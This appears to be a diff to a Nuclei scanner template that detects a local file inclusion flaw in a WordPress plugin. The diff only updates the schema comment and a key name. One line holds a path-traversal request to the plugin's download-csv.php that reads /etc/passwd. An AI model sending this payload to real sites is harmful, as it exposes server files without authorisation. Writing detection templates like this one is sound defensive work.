@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: admin-word-count-column-lfi
 
 info:
@@ -15,7 +16,7 @@ info:
     cwe-id: CWE-22
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0'
